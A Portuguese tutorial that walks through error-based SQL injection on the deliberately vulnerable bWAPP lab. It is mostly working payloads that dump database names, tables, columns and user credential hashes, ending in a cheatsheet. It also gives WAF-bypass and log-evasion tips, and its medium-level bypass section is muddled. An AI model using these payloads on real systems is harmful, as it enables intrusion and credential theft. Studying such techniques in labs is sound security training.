# SQL Injection Error-based — Guia Profundo
### Técnica + Walkthrough completo no bWAPP (PHP 7.4 + MariaDB 10.6)

> **Para quem é este material:** você já sabe o que é SQLi e conhece UNION-based pelo `guia_sqli.md`. Este guia aprofunda especificamente a técnica error-based: quando usá-la, como ela funciona por dentro, e como executar a enumeração completa do `information_schema` usando funções que vazam dados pelo próprio erro do banco.

---

## Sumário

1. [O que é error-based e por que existe](#1-o-que-é-error-based-e-por-que-existe)
2. [Quando usar error-based](#2-quando-usar-error-based)
3. [Como o truque funciona por dentro](#3-como-o-truque-funciona-por-dentro)
4. [Funções disponíveis em MySQL/MariaDB](#4-funções-disponíveis-em-mysqlmariadb)
5. [Detectando viabilidade no bWAPP](#5-detectando-viabilidade-no-bwapp)
6. [Enumeração completa via EXTRACTVALUE](#6-enumeração-completa-via-extractvalue)
7. [O limite de 32 caracteres — a pegadinha que pega todo mundo](#7-o-limite-de-32-caracteres--a-pegadinha-que-pega-todo-mundo)
8. [Variante legada: FLOOR + GROUP BY](#8-variante-legada-floor--group-by)
9. [Bypass para nível medium: hex em strings](#9-bypass-para-nível-medium-hex-em-strings)
10. [Pegadinhas e diagnósticos](#10-pegadinhas-e-diagnósticos)
11. [Cheatsheet final](#11-cheatsheet-final)

---

## 1. O que é error-based e por que existe

Existem três grandes canais para extrair dados em SQLi:

| Canal | Como funciona | Pré-requisito |
|-------|---------------|---------------|
| **UNION-based** | Você anexa um `SELECT` próprio e lê o resultado refletido na página | A aplicação imprime dados do SELECT no HTML |
| **Blind** | Você faz perguntas SIM/NÃO (boolean) ou mede tempo (time-based), extrai um char por vez | Nenhum — funciona sempre que a injeção existe |
| **Error-based** | Você força um erro do banco que contém o dado que quer extrair, lê a mensagem de erro | A aplicação exibe a mensagem de erro do banco na resposta |

O error-based existe porque há um cenário muito comum: a aplicação **não reflete dados** do SELECT na tela (então UNION não serve), mas **ainda exibe mensagens de erro do banco** no HTML ou no body da resposta. É um logging descuidado — o desenvolvedor pensou em tratar o resultado, mas esqueceu de tratar o erro.

### Por que é mais rápido que blind?

Blind extrai um bit por requisição — no melhor caso, com busca binária, são 7 requisições por caractere, 49 por palavra de 7 letras. Para extrair uma tabela de 200 registros, são horas.

Error-based extrai um bloco de até 32 bytes em **uma única requisição**. Não tem comparação quando o canal existe.

### Por que é mais simples que UNION?

UNION exige que você conheça o número exato de colunas e quais aparecem no HTML — o que envolve pelo menos uns 10 payloads de setup. Error-based não precisa de nada disso: você injeta uma função, ela falha, você lê o erro. Dois passos.

---

## 2. Quando usar error-based

✅ **Use quando:**

- Ao injetar `'` ou outro payload quebrado, a mensagem de erro **aparece literalmente no corpo da resposta** (não apenas num log interno ou nos headers)
- A aplicação usa `mysqli_error()`, `PDOException::getMessage()`, trace completo de exceção ou mensagem equivalente — e exibe isso pro usuário
- Você quer velocidade e não quer o trabalho de contar colunas pra UNION
- A query tem muitas colunas (20+) e a contagem via `ORDER BY` está sendo lenta ou estranha

❌ **Não use quando (troque de técnica):**

- O erro aparece apenas no status HTTP (500) mas o body é genérico — sem texto do banco → use **blind**
- O site mostra "Something went wrong" mas nenhum detalhe SQL → use **blind**
- A aplicação exibe dados da query no HTML → prefira **UNION-based** (mais limpo de ler)

💡 **Diagnóstico rápido:** injete uma aspa simples (`'`) no parâmetro. Se a resposta contém qualquer substring de `You have an error in your SQL syntax`, `XPATH syntax error`, `Duplicate entry`, ou stack trace PHP/Java com SQL dentro, error-based é viável.

---

## 3. Como o truque funciona por dentro

O princípio é simples: algumas funções do MySQL/MariaDB esperam argumentos em formatos específicos. Se você fornecer algo fora do formato, elas geram um erro. O ponto chave é que **o erro inclui literalmente o valor que elas receberam**.

Então você passa o resultado de uma `subquery` como argumento dessas funções, elas tentam processar, falham, e o banco gera uma mensagem de erro que contém o resultado da subquery.

Exemplo concreto com `EXTRACTVALUE`:

```sql
-- EXTRACTVALUE espera: EXTRACTVALUE(xml_frag, xpath_expr)
-- xpath_expr deve ser uma expressão XPath válida
-- '~bWAPP' não é XPath válido → erro

SELECT EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())));

-- O banco avalia a subquery: database() → 'bWAPP'
-- CONCAT(0x7e, 'bWAPP') → '~bWAPP'
-- EXTRACTVALUE(1, '~bWAPP') → erro: XPATH syntax error: '~bWAPP'
```

O `0x7e` (til `~`) é necessário por dois motivos:
1. Garante que o XPath seja inválido (uma string sem `~` poderia, por coincidência, ser um XPath válido e não gerar erro)
2. Serve como delimitador visual — você sabe que o dado começa depois do `~`

O dado aparece **no próprio erro** retornado. Se a aplicação imprime esse erro no HTML, você leu o valor.

---

## 4. Funções disponíveis em MySQL/MariaDB

Não existe só uma técnica error-based — existem várias funções que se prestam a isso, cada uma com seu mecanismo e suas limitações. Conhecer todas é importante para quando uma estiver bloqueada por WAF ou não for suportada pela versão.

### 4.1 EXTRACTVALUE

```sql
EXTRACTVALUE(xml_frag, xpath_expr)
```

Falha quando `xpath_expr` começa com um caractere não-XPath (como `~`). O erro exibe o valor do argumento até ~32 bytes.

```sql
EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())))
-- Erro: XPATH syntax error: '~bWAPP'
```

### 4.2 UPDATEXML

```sql
UPDATEXML(xml_target, xpath_expr, new_xml)
```

Mesma família, mesma limitação de ~32 bytes. Às vezes preferida porque o nome pode passar por WAFs que bloqueiam só `EXTRACTVALUE`.

```sql
UPDATEXML(1, CONCAT(0x7e, (SELECT database())), 1)
-- Erro: XPATH syntax error: '~bWAPP'
```

### 4.3 FLOOR + RAND + GROUP BY (técnica clássica legada)

Não usa XPath — explora uma condição de corrida na avaliação de `RAND()` dentro de `GROUP BY`. Gera erro de chave duplicada contendo o dado. Mais complexo e frágil; documentado na [Seção 8](#8-variante-legada-floor--group-by).

```sql
SELECT COUNT(*) FROM information_schema.tables
GROUP BY CONCAT((SELECT database()), 0x3a, FLOOR(RAND(0)*2))
-- Erro: Duplicate entry 'bWAPP:1' for key '<group_key>'
```

### 4.4 EXP (overflow de double)

Explora overflow aritmético no tipo `DOUBLE`. O trucamento `~(...)` é um NOT bitwise que transforma qualquer número em um inteiro enorme, `EXP` desse número estoura.

```sql
EXP(~(SELECT * FROM (SELECT database()) x))
-- Erro: DOUBLE value is out of range in 'exp(~((select 'bWAPP')))'
```

⚠️ Presente no MySQL 5.5–5.7. **Removido no MySQL 8.0+**. No MariaDB 10.6 pode funcionar dependendo da configuração.

### 4.5 GTID_SUBSET / GTID_SUBTRACT

Funções de replicação MySQL (>= 5.6) que esperam um formato específico de GTID set. Se você passar uma string arbitrária, o erro vaza o valor.

```sql
GTID_SUBSET((SELECT database()), 1)
-- Erro: Malformed GTID set specification 'bWAPP'.
```

💡 Útil como bypass quando WAF bloqueia `EXTRACTVALUE` e `UPDATEXML` mas não conhece funções de replicação.

### 4.6 JSON_KEYS

Disponível no MySQL >= 5.7 e MariaDB >= 10.2. Espera JSON válido; se você passar uma string comum, erro.

```sql
JSON_KEYS((SELECT CONCAT(0x7e, (SELECT database()))))
-- Erro: Invalid JSON text: "Invalid value." at position 0 in value for argument 1 to function json_keys.
```

⚠️ O valor extraído nem sempre aparece diretamente na mensagem de erro — depende da versão. Teste antes de depender.

### 4.7 Tabela comparativa

| Função | Suporte MySQL | Suporte MariaDB | Limite no erro | Requer `~` | Melhor uso |
|--------|--------------|-----------------|----------------|------------|------------|
| `EXTRACTVALUE` | 5.1+ | 5.2+ | ~32 bytes | Sim | **Padrão — use sempre primeiro** |
| `UPDATEXML` | 5.1+ | 5.2+ | ~32 bytes | Sim | Alternativa quando EXTRACTVALUE bloqueado |
| `FLOOR+GROUP BY` | 5.0–5.6 (instável em 5.7+) | 5.2–10.x (instável) | sem limite fixo | Não | MySQL antigo sem as funções XML |
| `EXP` overflow | 5.5–5.7 | 10.x (variável) | valor no erro | Não | Bypass de WAF, MySQL legado |
| `GTID_SUBSET` | 5.6+ | 10.0+ | curta | Não | Bypass de WAF que bloqueia XML |
| `JSON_KEYS` | 5.7+ | 10.2+ | variável | Não | Bypass em ambientes modernos |

---

## 5. Detectando viabilidade no bWAPP

### 5.1 Por que o bWAPP é ideal para esta técnica

Em `bWAPP/sqli_1.php:156` há exatamente:

```php
die("Error: " . mysqli_error($link));
```

Toda exceção SQL é cuspida literalmente na resposta HTTP. Não tem logging interno, não tem supressão, não tem sanitização da mensagem. O erro chega limpo no browser — e no Repeater do Burp.

### 5.2 Alvo principal: `/sqli_1.php`

Query vulnerável (`bWAPP/sqli_1.php:143`):

```php
$sql = "SELECT * FROM movies WHERE title LIKE '%" . sqli($title) . "%'";
```

Em nível `low`, `sqli()` chama `no_check()` — sem filtro algum. O parâmetro `title` vai cru pra query.

Acesse `http://localhost/sqli_1.php`, faça login como `bee`/`bug`, Security Level = **low**.

### 5.3 Payload exploratório — detectando o erro

No Repeater do Burp, envie:

```
GET /sqli_1.php?title=iron'&action=search HTTP/1.1
```

Resposta esperada no body:

```
Error: You have an error in your SQL syntax; check the manual that corresponds
to your MariaDB server version for the right syntax to use near '%'' at line 1
```

Isso confirma dois fatores de uma vez:
1. O parâmetro é injetável (aspas quebram a sintaxe)
2. O erro do banco aparece no body da resposta (error-based viável)

### 5.4 Validando o canal error-based com payload piloto

Antes de tentar extrair dados, **valide o canal** com algo neutro que não depende de subquery:

```
iron' AND EXTRACTVALUE(1, 0x7e) -- -
```

Resposta esperada:

```
Error: XPATH syntax error: '~'
```

Se você vê o `~` na mensagem de erro, o canal está aberto. Se a página retorna normal (sem erro), EXTRACTVALUE não está sendo executado — reveja o contexto da injeção.

### 5.5 Prova de conceito com valor controlado por você

Um passo além: injete um valor que você mesmo escolheu e verifique se aparece no erro:

```
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, 0x504F43)) -- -
```

`0x504F43` = string `POC` em hex.

Resposta esperada:

```
Error: XPATH syntax error: '~POC'
```

✅ Se viu `~POC`, você provou controle total do canal. Agora substitua `0x504F43` por qualquer subquery e o resultado dela aparece no erro.

---

## 6. Enumeração completa via EXTRACTVALUE

Esta é a seção principal. Cada bloco abaixo é uma etapa do reconhecimento, com o payload exato, o que o banco executa, e o erro esperado.

> 💡 **Convenção de payload:** todos os exemplos usam `iron` como valor de busca "real" — mantém algum resultado na query base o que ajuda em diagnósticos. O `-- -` comenta o `%'` que sobra no final da query original.

---

### 6.1 Banco atual

**Payload:**
```
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) -- -
```

**O que acontece internamente:**
```sql
SELECT * FROM movies WHERE title LIKE '%iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())))%'
-- Após comentário:
-- WHERE title LIKE '%iron' AND EXTRACTVALUE(1, CONCAT('~', 'bWAPP'))
-- EXTRACTVALUE(1, '~bWAPP') → ERRO
```

**Erro esperado:**
```
Error: XPATH syntax error: '~bWAPP'
```

**Dado extraído:** `bWAPP`

---

### 6.2 Versão e usuário (duas informações numa requisição)

**Payload:**
```
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, version(), 0x3a, user())) -- -
```

`0x3a` = `:` — separador visual.

**Erro esperado:**
```
Error: XPATH syntax error: '~10.6.12-MariaDB:root@%'
```

**Dados extraídos:** versão do MariaDB + usuário da conexão. Confirma que estamos como `root` — escalada de privilégios já foi feita pelo próprio setup do ambiente.

⚠️ Se `version()` + `user()` somados ultrapassarem 32 chars, o resultado vai truncar. Nesse caso, extraia separadamente:

```
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, version())) -- -
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, user())) -- -
```

---

### 6.3 Lista de todos os bancos

**Payload:**
```
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata))) -- -
```

**Erro esperado:**
```
Error: XPATH syntax error: '~information_schema,bWAPP,mysql,perfo'
```

Perceba que o resultado está truncado em ~32 chars. Isso é normal — veja a [Seção 7](#7-o-limite-de-32-caracteres--a-pegadinha-que-pega-todo-mundo) para como paginar.

---

### 6.4 Lista de tabelas do banco atual

**Payload:**
```
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))) -- -
```

**Erro esperado (truncado):**
```
Error: XPATH syntax error: '~blog,heroes,movies,users,visitors'
```

Dependendo de quantas tabelas o bWAPP tiver, a lista pode truncar. Use `SUBSTRING` (Seção 7) se precisar ver o final.

---

### 6.5 Colunas da tabela `users`

**Payload:**
```
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users'))) -- -
```

**Erro esperado (truncado):**
```
Error: XPATH syntax error: '~id,login,password,email,secret,acti'
```

Lista truncada. Mas já dá pra ver as colunas mais importantes: `login`, `password`, `email`, `secret`. Para ver o restante, pagine (Seção 7).

---

### 6.6 Extraindo credenciais — o objetivo final

**Payload (primeiro usuário):**
```
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT CONCAT(login,0x3a,password) FROM users LIMIT 0,1))) -- -
```

**Erro esperado:**
```
Error: XPATH syntax error: '~bee:6885858486f31043e5839c735d99457f'
```

O hash `6885858486f31043e5839c735d99457f045affd0` é SHA-1 de `bug` — senha padrão do bWAPP.

**Segundo usuário:**
```
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT CONCAT(login,0x3a,password) FROM users LIMIT 1,1))) -- -
```

Incremente o primeiro argumento do `LIMIT` para percorrer todos os usuários.

🎯 **Payload com todos os usuários de uma vez (se couberem em 32 chars):**
```
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(login,0x3a,password SEPARATOR 0x7c) FROM users))) -- -
```

`0x7c` = `|` como separador de registros. Resultado truncado, mas já entrega o primeiro registro completo.

---

### 6.7 UPDATEXML como alternativa ao EXTRACTVALUE

**Payload equivalente para banco atual:**
```
iron' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database())), 1) -- -
```

**Erro esperado:**
```
Error: XPATH syntax error: '~bWAPP'
```

Idêntico ao EXTRACTVALUE na prática. Use UPDATEXML quando:
- Um WAF está bloqueando `EXTRACTVALUE` por nome
- Você quer variar os payloads para dificultar correlação em logs

Qualquer payload da Seção 6 funciona com UPDATEXML simplesmente trocando a função — o argumento interno (subquery) permanece idêntico.

---

## 7. O limite de 32 caracteres — a pegadinha que pega todo mundo

### 7.1 Por que existe o limite

`EXTRACTVALUE` e `UPDATEXML` impõem um limite interno no tamanho da mensagem de erro XPath. Na prática, o valor no erro aparece truncado em **aproximadamente 32 bytes** (pode variar alguns bytes entre versões do MariaDB/MySQL). Strings maiores são cortadas silenciosamente — você não recebe aviso, a string simplesmente para.

🚨 **Armadilha:** você extrai `GROUP_CONCAT` de tabelas e vê um resultado que parece completo. Na verdade está truncado. Se a lista tem 5 tabelas mas só aparecem 3 no erro, as outras 2 foram cortadas.

### 7.2 Diagnóstico do truncamento

Quando o erro terminar com um caractere "no meio" de uma palavra, ou quando a string no erro não parecer terminada logicamente, assuma truncamento. Exemplo:

```
XPATH syntax error: '~blog,heroes,movies,users,visi'
```

`visi` sem o `tors` final é sinal claro de corte.

### 7.3 Solução 1 — SUBSTRING para paginar

Extraia pedaços de 32 chars, incrementando o offset:

**Página 1 (chars 1–32):**
```
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), 1, 32))) -- -
```

**Página 2 (chars 33–64):**
```
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), 33, 32))) -- -
```

**Página 3 (chars 65–96):**
```
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), 65, 32))) -- -
```

Continue até o erro retornar só `~` (sem conteúdo depois) — isso indica que o offset ultrapassou o comprimento da string.

### 7.4 Solução 2 — LIMIT por linha (mais limpo)

Em vez de paginar a string, retorne um registro por requisição usando `LIMIT offset, 1`:

**Coluna 1 da tabela `users`:**
```
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 0,1))) -- -
```

**Coluna 2:**
```
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 1,1))) -- -
```

**Coluna 3:**
```
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 2,1))) -- -
```

Incrementar o offset do `LIMIT` é mais legível e evita confusão com offsets de string.

### 7.5 Solução 3 — filtrar para reduzir o output

Se você já sabe o que quer, filtre antes de concatenar:

```
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE login='bee'))) -- -
```

Resultado direto, sem paginação. Menos payload, menos ruído no log.

---

## 8. Variante legada: FLOOR + GROUP BY

### 8.1 Quando usar

Esta técnica funciona em MySQL 5.0–5.6 e em algumas versões do MariaDB. Não depende das funções XML, então é útil quando:
- `EXTRACTVALUE` e `UPDATEXML` não existem (MySQL muito antigo — raro hoje)
- O WAF bloqueia essas funções por nome e você não tem alternativa
- Você está em ambiente de CTF ou laboratório com versão antigo propositalmente

⚠️ É frágil: o comportamento depende de uma condição de corrida interna do otimizador. Em MySQL 5.7+ e MariaDB 10.6+ pode não funcionar de forma confiável.

### 8.2 Como funciona

O mecanismo explora o fato de que `RAND(0)` dentro de `GROUP BY` é avaliado mais de uma vez para a mesma linha. Isso cria uma situação onde um valor pode ser inserido no índice temporário duas vezes, gerando erro de chave duplicada — e esse erro inclui o valor da expressão.

**Payload:**
```
iron' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) -- -
```

**Erro esperado:**
```
Error: Duplicate entry 'bWAPP1' for key '<group_key>'
```

O dado aparece antes do `1` (que vem de `FLOOR(RAND(0)*2)` valendo 1).

### 8.3 Extraindo outros dados

Troque `(SELECT database())` por qualquer subquery:

```
iron' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) -- -
```

**Erro esperado:**
```
Error: Duplicate entry 'blog,heroes,movies,users,visitors1' for key '<group_key>'
```

Nota: não tem o limite de 32 chars, mas tem o limite do `group_concat_max_len` (padrão 1024 bytes).

### 8.4 Por que não usar como técnica principal

- Não funciona em MySQL 8.0+ (o otimizador foi reescrito)
- Em MariaDB 10.6 o comportamento é instável — às vezes funciona, às vezes não
- Precisa de `information_schema.tables` na query externa (mais verboso)
- EXTRACTVALUE/UPDATEXML são mais previsíveis e mais simples

Use como **fallback**, não como primeira escolha.

---

## 9. Bypass para nível medium: hex em strings

### 9.1 O que muda no nível medium

Em `bWAPP/functions_external.php`, nível `medium` usa `addslashes()`. Isso escapa aspas simples, aspas duplas e barras invertidas — qualquer string literal no seu payload que precise de aspas fica bloqueada.

Por exemplo, o payload da Seção 6.5:

```sql
... AND table_name='users' ...
```

Vira isso após `addslashes`:

```sql
... AND table_name=\'users\' ...
```

Que quebra a sintaxe (ou é interpretado como string vazia dependendo do contexto).

### 9.2 A solução: representação hex

MySQL e MariaDB aceitam strings literais como sequências hex sem aspas:

```sql
'users'     →    0x7573657273
'bWAPP'     →    0x6257415050
```

Qualquer string pode ser representada assim, e o banco interpreta de forma idêntica — sem precisar de aspas.

### 9.3 Como converter no terminal

```bash
echo -n 'users' | xxd -p
# Output: 7573657273
# Use no payload como: 0x7573657273

echo -n 'bWAPP' | xxd -p
# Output: 6257415050
# Use no payload como: 0x6257415050

echo -n 'login' | xxd -p
# Output: 6c6f67696e
# Use no payload como: 0x6c6f67696e
```

### 9.4 Payload adaptado para medium

Payload original (level low):
```
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users'))) -- -
```

Payload adaptado (level medium — aspas trocadas por hex):
```
iron\' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name=0x7573657273))) -- -
```

O `iron\'` com barra antes da aspa é porque você ainda precisa fechar a string aberta pela query original — o `addslashes` vai escapar sua aspa, mas no contexto de medium o `sqli_1.php` não usa prepared statements, então a barra antes acaba sendo interpretada como parte da busca, mas a injeção em si (o `AND EXTRACTVALUE...`) funciona porque não usa aspas.

💡 Na prática para medium em `sqli_1.php`, o ponto de injeção muda: o parâmetro está dentro de LIKE com aspa escapada. O que sobra explorável são contextos numéricos (`sqli_2.php`) — onde aspa nem é necessária — e o uso de hex para substituir strings literais na subquery.

### 9.5 Hex para outros valores úteis

| String | Hex | Uso |
|--------|-----|-----|
| `users` | `0x7573657273` | `table_name=0x7573657273` |
| `bWAPP` | `0x6257415050` | `table_schema=0x6257415050` |
| `login` | `0x6c6f67696e` | `column_name=0x6c6f67696e` |
| `password` | `0x70617373776f7264` | `column_name=0x70617373776f7264` |
| `bee` | `0x626565` | `WHERE login=0x626565` |

---

## 10. Pegadinhas e diagnósticos

### 10.1 Esqueceu o `~` (0x7e) — a mais comum

```
iron' AND EXTRACTVALUE(1, (SELECT database())) -- -
```

Sem o `~`, o resultado da subquery (`bWAPP`) pode ser interpretado como uma expressão XPath válida (ou pelo menos não gera um erro que contenha o valor). O erro vai ser genérico ou a função retorna vazio.

**Regra:** sempre inclua `0x7e` (ou outro caractere inválido como XPath) antes do dado:

```
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) -- -
```

### 10.2 O erro sai mas sem o valor

Você vê `XPATH syntax error: '~'` mas o til está sozinho, sem o dado depois. Isso pode ser:

1. A subquery retornou NULL — verifique se a tabela/coluna existe e se o `WHERE` está correto
2. A subquery retornou string vazia — mesmo diagnóstico
3. `GROUP_CONCAT` retornou NULL porque não há linhas — verifique o filtro `WHERE table_schema=database()`

**Teste de sanidade:** troque a subquery por uma string hardcoded primeiro:

```
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, 'TESTE123')) -- -
```

Se aparecer `~TESTE123` no erro, o canal funciona — o problema é na subquery.

### 10.3 Truncamento silencioso de 32 chars

Já abordado na Seção 7, mas vale repetir como diagnóstico: se a string no erro terminar abruptamente no meio de uma palavra ou sem vírgula/ponto esperado, está truncada. Use SUBSTRING para paginar.

### 10.4 MariaDB vs MySQL — diferenças nas mensagens

MariaDB 10.5+ pode exibir mensagens de erro ligeiramente diferentes de MySQL. O texto `XPATH syntax error` é o mesmo, mas outros erros podem ter wording diferente. Sempre verifique se o erro contém o dado — não assuma o texto exato das mensagens de exemplo.

### 10.5 GROUP_CONCAT excedendo o limite da sessão

`GROUP_CONCAT` tem um limite de tamanho por padrão de 1024 bytes (`group_concat_max_len`). Se você estiver concatenando muitas tabelas ou colunas e o resultado estiver aparecendo cortado no ponto esperado para o limite do `GROUP_CONCAT` (não do XPath), aumente na sessão — mas isso exige permissão:

```sql
SET SESSION group_concat_max_len = 10000;
```

Em um contexto de pentest, se não tiver permissão de `SET`, use LIMIT por linha (Seção 7.4) — mais trabalho, mas funciona sem privilégio extra.

### 10.6 WAF bloqueando EXTRACTVALUE ou UPDATEXML

Se a aplicação retorna 403 ou bloqueia sua requisição com `EXTRACTVALUE` ou `UPDATEXML`:

1. Tente **UPDATEXML** (se não bloqueou junto)
2. Tente **GTID_SUBSET** — funções de replicação costumam passar por WAFs de regra simples:
   ```
   iron' AND GTID_SUBSET((SELECT database()), 1) -- -
   ```
3. Tente **EXP** se a versão for MySQL < 8.0:
   ```
   iron' AND EXP(~(SELECT * FROM (SELECT database())x)) -- -
   ```
4. Quebre o nome da função com comentário: `EXTRACT/**/VALUE` — WAFs de string literal não preveem isso

### 10.7 Aplicação filtrando o `~` (0x7e)

Raro, mas existe. Se o WAF bloquear literalmente o caractere til:

- Use `0x21` → `!` (ponto de exclamação)
- Use `0x23` → `#` (jogo da velha)
- Use `0x40` → `@` (arroba)

Qualquer caractere que não seja um XPath válido no início da expressão serve. Teste:

```
iron' AND EXTRACTVALUE(1, CONCAT(0x21, (SELECT database()))) -- -
-- Erro esperado: XPATH syntax error: '!bWAPP'
```

### 10.8 Subquery retorna mais de uma linha

`EXTRACTVALUE` não aceita subquery que retorna múltiplas linhas:

```
ERROR 1242 (21000): Subquery returns more than 1 row
```

Isso acontece quando você esquece o `LIMIT 0,1` numa query que pode retornar várias linhas. Sempre use `LIMIT` ou `GROUP_CONCAT` para reduzir a um único valor escalar:

```sql
-- Errado (pode retornar várias linhas):
(SELECT column_name FROM information_schema.columns WHERE table_name='users')

-- Correto (uma linha por vez):
(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)

-- Correto (todas as linhas concatenadas):
(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users')
```

---

## 11. Cheatsheet final

Use como referência rápida durante o pentest. Todos os payloads para `sqli_1.php` com nível `low`.

```
# ── VALIDAÇÃO DO CANAL ──────────────────────────────────────────────────────

# 1. Confirmar injeção (quebrar a query)
iron'

# 2. Confirmar que erro aparece na resposta (não só no log)
iron' AND EXTRACTVALUE(1, 0x7e) -- -
# → XPATH syntax error: '~'

# 3. Prova de controle do canal (valor você escolheu)
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, 0x504F43)) -- -
# → XPATH syntax error: '~POC'


# ── RECONHECIMENTO BÁSICO ────────────────────────────────────────────────────

# Banco atual
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) -- -

# Versão + usuário
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, version(), 0x3a, user())) -- -

# Versão só
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, version())) -- -

# Usuário só
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, user())) -- -


# ── ENUMERAÇÃO DO information_schema ─────────────────────────────────────────

# Lista de bancos
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata))) -- -

# Lista de tabelas do banco atual
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))) -- -

# Colunas da tabela users
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users'))) -- -

# Colunas de users — uma por vez (evita truncamento)
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 0,1))) -- -
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 1,1))) -- -
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 2,1))) -- -


# ── EXTRAÇÃO DE DADOS ────────────────────────────────────────────────────────

# Credenciais — primeiro usuário
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT CONCAT(login,0x3a,password) FROM users LIMIT 0,1))) -- -

# Credenciais — segundo usuário
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT CONCAT(login,0x3a,password) FROM users LIMIT 1,1))) -- -

# Credenciais — todos de uma vez (pode truncar, mas entrega o primeiro completo)
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(login,0x3a,password SEPARATOR 0x7c) FROM users))) -- -

# Secret do usuário bee
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT secret FROM users WHERE login='bee' LIMIT 0,1))) -- -


# ── BYPASS DO LIMITE DE 32 CHARS (SUBSTRING) ─────────────────────────────────

# Página 1 (chars 1-32)
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), 1, 32))) -- -

# Página 2 (chars 33-64)
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), 33, 32))) -- -

# Página 3 (chars 65-96)
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), 65, 32))) -- -


# ── UPDATEXML COMO ALTERNATIVA ────────────────────────────────────────────────

# Banco atual
iron' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database())), 1) -- -

# Qualquer subquery — só troca EXTRACTVALUE(1, X) por UPDATEXML(1, X, 1)
iron' AND UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())), 1) -- -


# ── BYPASS PARA MEDIUM (strings → hex) ───────────────────────────────────────

# Colunas de users com table_name em hex (sem aspas)
iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name=0x7573657273))) -- -

# Conversão no terminal
# echo -n 'users'    | xxd -p  →  7573657273  →  0x7573657273
# echo -n 'bWAPP'   | xxd -p  →  6257415050  →  0x6257415050
